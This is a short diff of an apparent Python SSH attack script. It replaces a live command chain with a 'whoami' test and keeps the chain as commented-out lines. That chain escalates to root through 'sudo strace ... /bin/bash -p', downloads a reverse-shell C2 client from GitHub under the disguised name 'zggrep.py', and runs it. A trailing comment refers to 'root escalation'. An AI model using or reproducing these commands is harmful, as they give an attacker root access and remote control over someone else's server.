@@ -43,14 +43,19 @@ try:
     # Connect to the server
     client.connect(hostname, port=port, username=username, password=password)
     
-    commands = ["sudo /bin/strace -o /dev/null /bin/bash -p", "cd ../../usr/bin",
-                "curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py", 
-                "python3 zggrep.py"]
-    full_command = " && ".join(commands)
-    
-    stdin, stdout, stderr = client.exec_command(full_command)
+    # test 
+    stdin, stdout, stderr = client.exec_command("whoami")
     print(stdout.read().decode())
     print(stderr.read().decode())
+    
+    # commands = ["sudo /bin/strace -o /dev/null /bin/bash -p", "cd ../../usr/bin",
+    #             "curl -o zggrep.py https://raw.githubusercontent.com/lbowne1/reverse_shell_c2/main/client.py", 
+    #             "python3 zggrep.py"]
+    # full_command = " && ".join(commands)
+    
+    # stdin, stdout, stderr = client.exec_command(full_command)
+    # print(stdout.read().decode())
+    # print(stderr.read().decode())
 
     
     # # Execute root escalation
